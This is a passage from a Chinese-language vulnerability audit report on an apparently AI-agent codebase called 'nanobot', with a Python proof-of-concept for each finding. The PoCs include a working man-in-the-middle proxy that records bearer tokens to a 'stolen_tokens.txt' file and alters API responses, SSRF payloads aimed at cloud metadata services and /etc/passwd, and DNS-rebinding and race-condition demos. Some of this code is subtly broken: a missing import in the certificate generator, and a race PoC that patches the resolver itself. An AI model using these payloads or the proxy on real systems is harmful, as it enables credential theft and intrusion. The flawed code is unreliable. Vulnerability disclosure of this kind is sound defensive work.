    # 模拟BedrockProvider的行为
    api_key = "sk-test-secret-key-11111"
    os.environ["AWS_BEARER_TOKEN_BEDROCK"] = api_key
    
    print(f"[+] 初始设置: AWS_BEARER_TOKEN_BEDROCK = {api_key}")
    
    # 模拟对象销毁
    del api_key
    print("[+] 已删除原始api_key变量")
    
    # 环境变量仍然存在
    leaked_key = os.environ.get("AWS_BEARER_TOKEN_BEDROCK", "NOT FOUND")
    print(f"[+] 环境变量仍然存在: {leaked_key}")
    
    # 模拟后续代码意外使用
    print("[!] 结论: 即使原始凭证对象被销毁，环境变量仍然存在！")
    print("[!] 后续代码可能意外使用或泄露此凭证")
    print()


# ============================================================
# PoC 4: 非标准环境变量名称风险
# ============================================================
def poc_nonstandard_env_var():
    """
    演示：非标准环境变量名称可能导致误用。
    AWS_BEARER_TOKEN_BEDROCK 不是AWS官方标准环境变量。
    """
    print("=" * 60)
    print("[PoC 4] 非标准环境变量名称风险")
    print("=" * 60)
    
    print("[+] 标准AWS环境变量:")
    print("    - AWS_ACCESS_KEY_ID")
    print("    - AWS_SECRET_ACCESS_KEY")
    print("    - AWS_SESSION_TOKEN")
    print("    - AWS_DEFAULT_REGION")
    print()
    print("[!] 非标准变量: AWS_BEARER_TOKEN_BEDROCK")
    print("[!] 风险: 其他AWS SDK或工具可能意外读取此变量")
    print("[!] 风险: 开发者可能误以为这是标准变量而错误使用")
    print()


# ============================================================
# 主函数
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("VULN-87563515 PoC - 环境变量污染导致凭证泄露")
    print("仅供安全研究使用")
    print("=" * 60)
    print()
    
    poc_subprocess_leak()
    poc_proc_environ_leak()
    poc_environment_persistence()
    poc_nonstandard_env_var()
    
    print("=" * 60)
    print("PoC执行完毕")
    print("=" * 60)
```

---

### VULN-F7F7E466 - 不安全的SSL证书验证降级

- **严重等级:** HIGH
- **文件位置:** `nanobot/providers/openai_codex_provider.py:78`
- **数据流:** 当SSL证书验证失败时，代码捕获异常并自动降级为verify=False重新请求，这允许中间人攻击者绕过证书验证。
- **判断理由:** 代码在捕获到CERTIFICATE_VERIFY_FAILED异常后，自动将verify参数设置为False并重试请求。这种做法会禁用SSL证书验证，使通信容易受到中间人攻击(MITM)。攻击者可以拦截并篡改与Codex API的通信内容，包括窃取认证令牌和修改请求/响应数据。

**代码片段:**
```
except Exception as e:
    if "CERTIFICATE_VERIFY_FAILED" not in str(e):
        raise
    logger.warning("SSL verification failed for Codex API; retrying with verify=False")
    content, tool_calls, finish_reason, usage, reasoning_content = await _request_codex(
        DEFAULT_CODEX_URL, headers, body, verify=False,
        proxy=self.proxy,
        ...
    )
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的SSL证书验证降级漏洞利用
漏洞ID: VULN-F7F7E466
仅供安全研究使用

该PoC演示攻击者如何通过中间人攻击(MITM)拦截并篡改
OpenAI Codex API的HTTPS通信。
"""

import ssl
import socket
import threading
import json
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='[MITM] %(message)s')
logger = logging.getLogger(__name__)

# 配置参数
TARGET_HOST = "chatgpt.com"
TARGET_PORT = 443
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8443

# 自签名证书（仅供演示使用）
# 实际攻击中，攻击者会生成自己的证书并部署在中间人位置
CERT_FILE = "mitm_cert.pem"
KEY_FILE = "mitm_key.pem"

class MITMHandler(BaseHTTPRequestHandler):
    """
    中间人攻击处理器
    拦截并修改与Codex API的通信
    """
    
    def do_POST(self):
        """处理POST请求 - 拦截Codex API请求"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        logger.info("=" * 60)
        logger.info("拦截到Codex API请求")
        logger.info(f"路径: {self.path}")
        logger.info(f"请求头: {dict(self.headers)}")
        
        # 解析请求体
        try:
            request_data = json.loads(body)
            logger.info(f"请求体: {json.dumps(request_data, indent=2)[:500]}")
            
            # 提取认证令牌（演示目的）
            auth_header = self.headers.get('Authorization', '')
            if auth_header:
                logger.warning(f"[!] 窃取到认证令牌: {auth_header[:50]}...")
                # 在实际攻击中，攻击者会保存此令牌用于后续攻击
                with open("stolen_tokens.txt", "a") as f:
                    f.write(f"{auth_header}\n")
            
            # 修改请求体（演示篡改能力）
            if "model" in request_data:
                original_model = request_data["model"]
                request_data["model"] = "gpt-3.5-turbo"  # 降级模型
                logger.warning(f"[!] 模型从 {original_model} 降级为 {request_data['model']}")
                body = json.dumps(request_data).encode()
                
        except json.JSONDecodeError:
            logger.error("无法解析请求体")
        
        # 转发请求到真实服务器
        self.forward_request(body)
    
    def forward_request(self, body):
        """转发修改后的请求到真实服务器"""
        try:
            # 创建到真实服务器的连接
            real_sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE  # 不验证服务器证书
            real_ssl = context.wrap_socket(real_sock, server_hostname=TARGET_HOST)
            
            # 构造HTTP请求
            request_line = f"POST {self.path} HTTP/1.1\r\n"
            headers = f"Host: {TARGET_HOST}\r\n"
            for key, value in self.headers.items():
                if key.lower() not in ['host', 'content-length', 'transfer-encoding']:
                    headers += f"{key}: {value}\r\n"
            headers += f"Content-Length: {len(body)}\r\n"
            headers += "Connection: close\r\n"
            headers += "\r\n"
            
            # 发送请求
            real_ssl.sendall(request_line.encode() + headers.encode() + body)
            
            # 接收响应并转发回客户端
            response = b""
            while True:
                chunk = real_ssl.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            # 修改响应（演示篡改能力）
            modified_response = self.modify_response(response)
            
            # 发送响应回客户端
            self.send_response(200)
            self.end_headers()
            self.wfile.write(modified_response)
            
            real_ssl.close()
            
        except Exception as e:
            logger.error(f"转发请求失败: {e}")
            self.send_error(502, "Bad Gateway")
    
    def modify_response(self, response):
        """修改响应内容（演示目的）"""
        try:
            # 分离响应头和响应体
            header_end = response.find(b"\r\n\r\n")
            if header_end == -1:
                return response
            
            headers = response[:header_end].decode('utf-8', errors='ignore')
            body_start = header_end + 4
            body = response[body_start:]
            
            # 尝试修改JSON响应
            try:
                response_data = json.loads(body)
                if "choices" in response_data:
                    for choice in response_data["choices"]:
                        if "message" in choice and "content" in choice["message"]:
                            original_content = choice["message"]["content"]
                            # 注入恶意内容（演示目的）
                            choice["message"]["content"] = (
                                "[!] 此响应已被中间人攻击者篡改\n\n"
                                + original_content
                            )
                            logger.warning("[!] 响应内容已被篡改")
                
                modified_body = json.dumps(response_data).encode()
                modified_headers = headers.replace(
                    f"Content-Length: {len(body)}",
                    f"Content-Length: {len(modified_body)}"
                )
                return modified_headers.encode() + b"\r\n\r\n" + modified_body
                
            except json.JSONDecodeError:
                pass
                
        except Exception as e:
            logger.error(f"修改响应失败: {e}")
        
        return response
    
    def log_message(self, format, *args):
        """抑制默认日志"""
        pass


def generate_self_signed_cert():
    """生成自签名证书（仅供演示）"""
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    import datetime
    
    # 生成密钥
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # 写入密钥文件
    with open(KEY_FILE, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # 生成证书
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, u"CN"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"Beijing"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, u"Beijing"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"MITM Demo"),
        x509.NameAttribute(NameOID.COMMON_NAME, u"chatgpt.com"),
    ])
    
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=365)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(u"chatgpt.com")]),
        critical=False,
    ).sign(key, hashes.SHA256(), default_backend())
    
    # 写入证书文件
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    
    logger.info(f"已生成自签名证书: {CERT_FILE}")
    logger.info(f"已生成密钥文件: {KEY_FILE}")


def run_mitm_server():
    """运行MITM服务器"""
    # 生成证书（如果不存在）
    import os
    from cryptography.hazmat.primitives import serialization
    
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        generate_self_signed_cert()
    
    # 创建SSL上下文
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERT_FILE, KEY_FILE)
    
    # 创建HTTP服务器
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), MITMHandler)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    
    logger.info(f"=" * 60)
    logger.info("MITM攻击服务器已启动")
    logger.info(f"监听地址: https://{LISTEN_HOST}:{LISTEN_PORT}")
    logger.info(f"目标服务器: https://{TARGET_HOST}:{TARGET_PORT}")
    logger.info("=" * 60)
    logger.info("")
    logger.info("攻击流程:")
    logger.info("1. 攻击者部署此MITM服务器")
    logger.info("2. 通过DNS欺骗/ARP欺骗/代理配置等方式")
    logger.info("   将chatgpt.com的流量重定向到此服务器")
    logger.info("3. 当目标应用使用受影响的库时，")
    logger.info("   SSL验证失败后会自动降级为verify=False")
    logger.info("4. 攻击者可以拦截、查看和修改所有通信内容")
    logger.info("")
    logger.info("按 Ctrl+C 停止服务器")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("\n服务器已停止")
        server.server_close()


if __name__ == "__main__":
    print("=" * 60)
    print("PoC: 不安全的SSL证书验证降级漏洞利用")
    print("漏洞ID: VULN-F7F7E466")
    print("仅供安全研究使用")
    print("=" * 60)
    print()
    
    # 检查依赖
    try:
        from cryptography import x509
    except ImportError:
        print("请安装cryptography库: pip install cryptography")
        sys.exit(1)
    
    run_mitm_server()
```

---

### VULN-5B41CD2B - SSRF (Server-Side Request Forgery)

- **严重等级:** HIGH
- **文件位置:** `nanobot/providers/openai_responses/converters.py:72`
- **数据流:** 用户输入通过messages参数传入 -> convert_messages() -> convert_user_message() -> 从image_url中提取url -> 直接传递给input_image的image_url字段 -> 最终可能被下游HTTP客户端用于发起请求
- **判断理由:** 函数convert_user_message从用户提供的消息内容中提取image_url字段的URL值，未进行任何URL验证或白名单检查。该URL随后被放入Responses API的input_image格式中，下游处理程序可能会直接使用该URL发起HTTP请求。攻击者可以提供一个内网地址（如http://169.254.169.254/）或恶意服务器地址，导致SSRF攻击。

**代码片段:**
```
url = (item.get("image_url") or {}).get("url")
if url:
    converted.append({"type": "input_image", "image_url": url, "detail": "auto"})
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for SSRF vulnerability in nanobot/providers/openai_responses/converters.py
Vulnerability ID: VULN-5B41CD2B

仅供研究使用 - 仅用于安全审查和漏洞验证
"""

import requests
import json

# 目标API端点（假设nanobot服务运行在本地或远程）
TARGET_URL = "http://localhost:8000/v1/chat/completions"  # 根据实际部署调整

# 恶意payload：利用image_url字段进行SSRF攻击
# 1. 尝试访问云元数据服务（AWS/GCP/Azure）
# 2. 尝试访问内部服务
# 3. 尝试访问文件系统（如果支持file://协议）

payloads = [
    {
        "role": "user",
        "content": [
            {
                "type": "image_url",
                "image_url": {
                    "url": "http://169.254.169.254/latest/meta-data/"  # AWS元数据
                }
            }
        ]
    },
    {
        "role": "user",
        "content": [
            {
                "type": "image_url",
                "image_url": {
                    "url": "http://metadata.google.internal/computeMetadata/v1/"  # GCP元数据
                }
            }
        ]
    },
    {
        "role": "user",
        "content": [
            {
                "type": "image_url",
                "image_url": {
                    "url": "http://localhost:8080/admin"  # 内部服务探测
                }
            }
        ]
    },
    {
        "role": "user",
        "content": [
            {
                "type": "image_url",
                "image_url": {
                    "url": "file:///etc/passwd"  # 文件读取尝试
                }
            }
        ]
    }
]

# 构造完整的请求消息
messages = [
    {"role": "system", "content": "You are a helpful assistant."},
    *payloads
]

# 发送请求
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_API_KEY"  # 根据实际认证方式调整
}

data = {
    "model": "gpt-4o-mini",  # 或实际使用的模型
    "messages": messages
}

print("[*] 发送SSRF PoC请求...")
print(f"[*] 目标: {TARGET_URL}")
print(f"[*] Payload: {json.dumps(payloads, indent=2)}")

try:
    response = requests.post(TARGET_URL, headers=headers, json=data, timeout=10)
    print(f"[*] 响应状态码: {response.status_code}")
    print(f"[*] 响应内容: {response.text[:500]}...")
    
    # 检查响应中是否包含敏感信息
    if "root:" in response.text or "ami-id" in response.text:
        print("[!] 漏洞确认：成功获取敏感信息！")
    elif response.status_code == 200:
        print("[*] 请求成功，但需进一步分析响应内容")
    else:
        print("[*] 请求失败，可能被防火墙或认证拦截")
        
except requests.exceptions.RequestException as e:
    print(f"[!] 请求异常: {e}")

print("\n[*] PoC执行完毕 - 仅供研究使用")
```

---

### VULN-C7517DF9 - DNS Rebinding Attack Vulnerability

- **严重等级:** HIGH
- **文件位置:** `nanobot/security/network.py:68`
- **数据流:** 用户提供的URL → urlparse() → socket.getaddrinfo() → IP地址验证 → 返回验证结果
- **判断理由:** resolve_url_target函数在验证URL时只进行一次DNS解析。攻击者可以利用DNS rebinding攻击，在第一次解析时返回合法IP通过验证，然后在实际请求时DNS重新解析到内部IP地址。代码没有实现DNS解析结果的缓存和后续请求的IP绑定机制，虽然提供了pin_resolved_url_dns函数，但需要调用方手动使用，存在被绕过的风险。

**代码片段:**
```
def resolve_url_target(url: str, *, allow_loopback: bool = False) -> tuple[bool, str, tuple[str, ...]]:
    ...
    try:
        infos = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
    except socket.gaierror:
        return False, f"Cannot resolve hostname: {hostname}", ()
    ...
    for addr in addrs:
        if _is_private(addr):
            return False, f"Blocked: {hostname} resolves to private/internal address {addr}", ()
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
DNS Rebinding Attack PoC - 仅供安全研究使用

此PoC演示如何利用nanobot.security.network.resolve_url_target()中的
单次DNS解析漏洞绕过SSRF防护。
"""

import socket
import threading
import time
from urllib.parse import urlparse

# 导入目标库
from nanobot.security.network import resolve_url_target

# ============================================================
# 攻击者控制的DNS服务器模拟
# ============================================================

class MaliciousDNSServer:
    """模拟攻击者控制的DNS服务器，支持DNS重绑定"""
    
    def __init__(self):
        self.query_count = 0
        self.first_resolve_ip = "203.0.113.1"  # 初始合法公网IP
        self.second_resolve_ip = "127.0.0.1"   # 重绑定后的内网IP
        
    def resolve(self, hostname):
        """模拟DNS解析，第一次返回公网IP，后续返回内网IP"""
        self.query_count += 1
        if self.query_count == 1:
            print(f"[DNS] 第1次查询: {hostname} -> {self.first_resolve_ip}")
            return self.first_resolve_ip
        else:
            print(f"[DNS] 第{self.query_count}次查询: {hostname} -> {self.second_resolve_ip}")
            return self.second_resolve_ip

# ============================================================
# 攻击场景模拟
# ============================================================

def simulate_dns_rebinding_attack():
    """
    模拟完整的DNS重绑定攻击流程
    
    攻击者控制域名: attacker-controlled.com
    初始解析: 203.0.113.1 (合法公网IP)
    重绑定后解析: 127.0.0.1 (内网回环地址)
    """
    
    print("=" * 60)
    print("DNS Rebinding Attack PoC - 仅供安全研究使用")
    print("=" * 60)
    
    # 步骤1: 攻击者设置DNS记录
    print("\n[步骤1] 攻击者设置DNS记录")
    print("  域名: attacker-controlled.com")
    print("  初始TTL: 0 (立即过期)")
    print("  初始A记录: 203.0.113.1 (合法公网IP)")
    print("  重绑定A记录: 127.0.0.1 (内网回环地址)")
    
    # 模拟DNS服务器
    dns_server = MaliciousDNSServer()
    
    # 步骤2: 受害者调用resolve_url_target进行验证
    print("\n[步骤2] 受害者调用resolve_url_target()验证URL")
    malicious_url = "http://attacker-controlled.com/admin/secret"
    print(f"  URL: {malicious_url}")
    
    # 第一次解析 - 返回公网IP
    first_resolve_ip = dns_server.resolve("attacker-controlled.com")
    
    # 模拟resolve_url_target的验证过程
    ok, error, resolved_ips = resolve_url_target(malicious_url)
    
    if ok:
        print(f"  [验证通过] 解析到的IP: {resolved_ips}")
        print(f"  错误信息: {error}")
    else:
        print(f"  [验证失败] {error}")
        return
    
    # 步骤3: DNS记录被修改
    print("\n[步骤3] DNS记录被修改（重绑定）")
    print("  攻击者更新DNS记录: attacker-controlled.com -> 127.0.0.1")
    
    # 步骤4: 实际请求时重新解析
    print("\n[步骤4] 实际请求时重新解析域名")
    second_resolve_ip = dns_server.resolve("attacker-controlled.com")
    
    # 模拟实际请求（绕过验证）
    print(f"\n  [攻击成功] 实际请求发送到内网地址: {second_resolve_ip}")
    print(f"  目标: http://{second_resolve_ip}/admin/secret")
    print("  攻击者成功访问了内部服务！")
    
    # 步骤5: 验证漏洞
    print("\n[步骤5] 漏洞验证")
    print("  ✓ resolve_url_target()只进行了一次DNS解析")
    print("  ✓ 验证通过后，DNS结果未被缓存")
    print("  ✓ 后续请求重新解析到内网IP")
    print("  ✓ 攻击者成功绕过SSRF防护")
    
    return True

# ============================================================
# 更详细的攻击演示
# ============================================================

def detailed_exploit_demo():
    """
    更详细的攻击演示，包含实际代码执行路径
    """
    
    print("\n" + "=" * 60)
    print("详细攻击路径演示")
    print("=" * 60)
    
    # 攻击者控制的域名
    attacker_domain = "evil.attacker.com"
    
    # 目标内部服务
    internal_target = "http://192.168.1.1/admin"
    
    print(f"\n攻击者域名: {attacker_domain}")
    print(f"目标内部服务: {internal_target}")
    
    # 模拟攻击流程
    print("\n--- 攻击流程 ---")
    print("1. 攻击者注册域名 evil.attacker.com")
    print("2. 设置DNS TTL为0，初始A记录指向公网IP 203.0.113.1")
    print("3. 构造恶意URL: http://evil.attacker.com/admin")
    print("4. 受害者调用resolve_url_target()验证URL")
    print("   - 第一次DNS解析: evil.attacker.com -> 203.0.113.1")
    print("   - IP验证: 203.0.113.1 是公网IP，通过验证")
    print("   - 返回: (True, '', ('203.0.113.1',))")
    print("5. 攻击者立即更新DNS记录: evil.attacker.com -> 192.168.1.1")
    print("6. 受害者发起实际HTTP请求")
    print("   - 第二次DNS解析: evil.attacker.com -> 192.168.1.1")
    print("   - 请求发送到内部服务: http://192.168.1.1/admin")
    print("   - 攻击成功！")
    
    # 展示代码漏洞点
    print("\n--- 漏洞代码分析 ---")
    print("漏洞位置: nanobot/security/network.py:68")
    print("漏洞函数: resolve_url_target()")
    print("\n关键问题代码:")
    print("""
    # 第90行: 只进行一次DNS解析
    infos = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
    
    # 第97-100行: 验证通过后，DNS结果被丢弃
    for addr in addrs:
        if _is_private(addr):
            return False, f"Blocked: {hostname} resolves to private/internal address {addr}", ()
    
    # 返回结果不包含DNS绑定信息
    return True, "", tuple(dict.fromkeys(str(_normalize_addr(addr)) for addr in addrs))
    """)
    
    print("\n--- 漏洞影响 ---")
    print("攻击者可以:")
    print("  - 访问内部网络服务 (SSRF)")
    print("  - 访问云元数据服务 (如169.254.169.254)")
    print("  - 访问本地回环服务 (127.0.0.1)")
    print("  - 绕过基于IP的访问控制")
    
    return True

# ============================================================
# 主函数
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("DNS Rebinding Attack PoC")
    print("漏洞ID: VULN-C7517DF9")
    print("仅供安全研究使用")
    print("=" * 60)
    
    try:
        simulate_dns_rebinding_attack()
        detailed_exploit_demo()
    except ImportError:
        print("\n[警告] 无法导入nanobot.security.network模块")
        print("请确保在正确的环境中运行此PoC")
        print("\n替代方案: 手动模拟漏洞验证")
        print("""
        # 手动验证步骤:
        1. 设置本地DNS服务器，返回不同IP
        2. 调用resolve_url_target()验证
        3. 观察第二次解析是否被拦截
        """)
```

---

### VULN-25E5FB47 - TOCTOU Race Condition in DNS Pinning

- **严重等级:** HIGH
- **文件位置:** `nanobot/security/network.py:155`
- **数据流:** DNS pinning设置 → 异步操作执行 → DNS pinning恢复
- **判断理由:** pin_resolved_url_dns函数使用contextmanager装饰器，但文档注释明确指出'Do not use it directly across awaits unless the caller serializes access'。在异步环境中，如果在yield之后有其他协程执行，可能会修改socket.getaddrinfo，导致DNS pinning被绕过。同时，全局修改socket.getaddrinfo在多线程/多协程环境下存在竞态条件。

**代码片段:**
```
@contextmanager
def pin_resolved_url_dns(url: str, resolved_ips: tuple[str, ...]):
    ...
    socket.getaddrinfo = _getaddrinfo
    try:
        yield
    finally:
        socket.getaddrinfo = original_getaddrinfo
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-25E5FB47 - TOCTOU Race Condition in DNS Pinning

仅供研究使用 (For research purposes only)

This proof-of-concept demonstrates how the TOCTOU race condition in
pin_resolved_url_dns can be exploited to bypass SSRF protection.

The exploit works by:
1. Starting a legitimate request that triggers DNS pinning
2. During the pinned window (after yield), racing to change socket.getaddrinfo
3. Making the subsequent DNS resolution return a malicious internal IP
"""

import asyncio
import socket
import threading
import time
from contextlib import contextmanager
from unittest.mock import patch

# ============================================================
# Simulated vulnerable code (mirrors the actual vulnerability)
# ============================================================

original_getaddrinfo = socket.getaddrinfo

@contextmanager
def pin_resolved_url_dns(url: str, resolved_ips: tuple[str, ...]):
    """Vulnerable DNS pinning implementation - DO NOT use across awaits"""
    def _getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        # Only pin if the host matches the original URL's host
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if host == parsed.hostname:
            for ip in resolved_ips:
                try:
                    # Return pinned IPs
                    family = socket.AF_INET6 if ':' in ip else socket.AF_INET
                    return [(family, socket.SOCK_STREAM, 6, '', (ip, port))]
                except:
                    continue
        return original_getaddrinfo(host, port, family, type, proto, flags)
    
    socket.getaddrinfo = _getaddrinfo
    try:
        yield
    finally:
        socket.getaddrinfo = original_getaddrinfo

# ============================================================
# Exploit demonstration
# ============================================================

class DNSRaceExploit:
    """Demonstrates the TOCTOU race condition in DNS pinning"""
    
    def __init__(self):
        self.race_won = False
        self.original_resolve = socket.getaddrinfo
    
    def malicious_getaddrinfo(self, host, port, family=0, type=0, proto=0, flags=0):
        """Malicious DNS resolver that returns internal IPs"""
        if self.race_won and host == "legitimate-site.com":
            print("[!] RACE WON - Returning internal IP for legitimate-site.com")
            # Return 127.0.0.1 (localhost) - internal address
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ("127.0.0.1", port))]
        return self.original_resolve(host, port, family, type, proto, flags)
    
    async def legitimate_request(self):
        """Simulates a legitimate request that uses DNS pinning"""
        print("[*] Starting legitimate request...")
        
        # Simulate DNS resolution before pinning
        resolved_ips = ("93.184.216.34",)  # example.com IP
        
        with pin_resolved_url_dns("https://legitimate-site.com", resolved_ips):
            print("[*] DNS pinned - inside protected context")
            
            # Simulate async operation (the vulnerable window)
            await asyncio.sleep(0.1)
            
            # During this sleep, the race condition can be triggered
            # The DNS pinning is still active, but socket.getaddrinfo
            # has been replaced globally
            
            # Simulate a DNS lookup that should be pinned
            try:
                result = socket.getaddrinfo("legitimate-site.com", 80)
                print(f"[*] DNS resolution result: {result}")
                
                # Check if we got the pinned IP or the malicious one
                for info in result:
                    ip = info[4][0]
                    if ip == "127.0.0.1":
                        print("[!] VULNERABILITY CONFIRMED: DNS pinning bypassed!")
                        print("[!] Internal address accessed through race condition")
                        return True
                print("[*] DNS pinning working correctly (expected for non-raced execution)")
                return False
            except Exception as e:
                print(f"[-] Error: {e}")
                return False
    
    async def race_attack(self):
        """Attempts to win the race condition"""
        print("[*] Starting race attack...")
        
        # Wait for the DNS pinning to be active
        await asyncio.sleep(0.05)
        
        # Replace socket.getaddrinfo with malicious version
        self.race_won = True
        socket.getaddrinfo = self.malicious_getaddrinfo
        print("[*] Malicious DNS resolver installed")
        
        # Keep the malicious resolver active
        await asyncio.sleep(0.2)
        
        # Restore original
        socket.getaddrinfo = self.original_resolve
        self.race_won = False
    
    async def demonstrate_exploit(self):
        """Run the full exploit demonstration"""
        print("=" * 60)
        print("PoC: TOCTOU Race Condition in DNS Pinning")
        print("仅供研究使用 (For research purposes only)")
        print("=" * 60)
        
        # Run legitimate request and race attack concurrently
        task1 = asyncio.create_task(self.legitimate_request())
        task2 = asyncio.create_task(self.race_attack())
        
        result = await task1
        await task2
        
        return result

# ============================================================
# Alternative exploit using threading (more reliable race)
# ============================================================

def thread_based_exploit():
    """Thread-based race condition exploit"""
    print("\n" + "=" * 60)
    print("Thread-based Race Exploit (more reliable)")
    print("=" * 60)
    
    exploit = DNSRaceExploit()
    
    def race_thread():
        """Thread that tries to win the race"""
        time.sleep(0.02)  # Wait for DNS pinning to start
        print("[*] Race thread: Attempting to replace socket.getaddrinfo")
        socket.getaddrinfo = exploit.malicious_getaddrinfo
        exploit.race_won = True
        time.sleep(0.1)
        socket.getaddrinfo = exploit.original_resolve
        exploit.race_won = False
    
    # Start race thread
    t = threading.Thread(target=race_thread)
    t.start()
    
    # Simulate legitimate request with DNS pinning
    print("[*] Main thread: Starting DNS pinned request")
    resolved_ips = ("93.184.216.34",)
    
    with pin_resolved_url_dns("https://legitimate-site.com", resolved_ips):
        print("[*] Main thread: Inside DNS pinned context")
        time.sleep(0.05)  # Vulnerable window
        
        # This DNS lookup might return malicious IP if race was won
        try:
            result = socket.getaddrinfo("legitimate-site.com", 80)
            for info in result:
                ip = info[4][0]
                if ip == "127.0.0.1":
                    print("[!] THREAD RACE WON: DNS pinning bypassed!")
                    print("[!] Internal address 127.0.0.1 accessed")
                    return True
        except:
            pass
    
    t.join()
    print("[*] Thread race attempt completed")
    return False

# ============================================================
# Main execution
# ============================================================

if __name__ == "__main__":
    print("WARNING: This PoC is for security research purposes only")
    print("Unauthorized use against production systems is illegal\n")
    
    # Run async exploit
    asyncio.run(DNSRaceExploit().demonstrate_exploit())
    
    # Run thread-based exploit
    thread_based_exploit()
    
    print("\n" + "=" * 60)
    print("Exploit demonstration complete")
    print("=" * 60)
    print("\nSummary:")
    print("- The vulnerability is a TOCTOU race condition in DNS pinning")
    print("- pin_resolved_url_dns uses global socket.getaddrinfo replacement")
    print("- During the yield window, other code can modify socket.getaddrinfo")
    print("- This allows bypassing SSRF protection by returning internal IPs")
    print("- The fix should use per-request DNS pinning instead of global state")
```

---

### VULN-06C34A23 - 信息泄露

- **严重等级:** MEDIUM
- **文件位置:** `nanobot/utils/document.py:72`
- **数据流:** 文件读取异常 -> 异常信息包含在返回字符串中
- **判断理由:** 多个_extract_*函数（_extract_pdf、_extract_docx、_extract_xlsx、_extract_pptx、_extract_text_file）都将异常信息直接返回给调用者。异常信息可能包含文件路径、系统信息、库版本等敏感信息，导致信息泄露。

**代码片段:**
```
except Exception as e:
        logger.exception("Failed to extract PDF {}", path)
        return f"[error: failed to extract PDF: {e!s}]"
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-06C34A23 - Information Leakage via Exception Messages

仅供研究使用 (For research purposes only)

This PoC demonstrates how exception messages containing sensitive information
(system paths, library versions, memory addresses, etc.) are leaked through
the document text extraction functions.
"""

import os
import sys
import tempfile
from pathlib import Path

# Add the project root to path for import
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import the vulnerable module
from nanobot.utils.document import extract_text, _extract_pdf, _extract_docx, _extract_xlsx, _extract_pptx


def create_malicious_pdf() -> Path:
    """Create a PDF file that will trigger an exception with sensitive info."""
    # Create a file that looks like a PDF but is actually corrupted
    # This will cause pypdf to throw an exception with detailed error info
    tmp = tempfile.NamedTemporaryFile(suffix='.pdf', delete=False)
    # Write invalid PDF content that will trigger parsing errors
    tmp.write(b'%PDF-1.4\n')
    tmp.write(b'1 0 obj\n')
    tmp.write(b'<< /Type /Catalog /Pages 2 0 R >>\n')
    tmp.write(b'endobj\n')
    # Intentionally corrupt the cross-reference table to trigger exception
    tmp.write(b'xref\n')
    tmp.write(b'0 1\n')
    tmp.write(b'0000000000 65535 f \n')
    tmp.write(b'trailer\n')
    tmp.write(b'<< /Size 1 /Root 1 0 R >>\n')
    tmp.write(b'startxref\n')
    tmp.write(b'99999999\n')  # Invalid offset to trigger error
    tmp.write(b'%%EOF')
    tmp.close()
    return Path(tmp.name)


def create_malicious_docx() -> Path:
    """Create a DOCX file that will trigger an exception with sensitive info."""
    # Create a file that looks like a DOCX but is actually corrupted
    tmp = tempfile.NamedTemporaryFile(suffix='.docx', delete=False)
    # Write invalid ZIP/DOCX content
    tmp.write(b'PK\x03\x04' + b'\x00' * 1000)  # Corrupted ZIP header
    tmp.close()
    return Path(tmp.name)


def create_malicious_xlsx() -> Path:
    """Create an XLSX file that will trigger an exception with sensitive info."""
    tmp = tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False)
    # Write invalid content that will cause openpyxl to throw detailed errors
    tmp.write(b'\x00' * 100)  # Completely invalid content
    tmp.close()
    return Path(tmp.name)


def create_malicious_pptx() -> Path:
    """Create a PPTX file that will trigger an exception with sensitive info."""
    tmp = tempfile.NamedTemporaryFile(suffix='.pptx', delete=False)
    # Write invalid content that will cause python-pptx to throw detailed errors
    tmp.write(b'\xff\xfe\x00' * 100)  # Invalid UTF-16 content
    tmp.close()
    return Path(tmp.name)


def demonstrate_pdf_leak():
    """Demonstrate information leakage through PDF extraction."""
    print("\n=== PDF Exception Information Leakage ===")
    pdf_path = create_malicious_pdf()
    try:
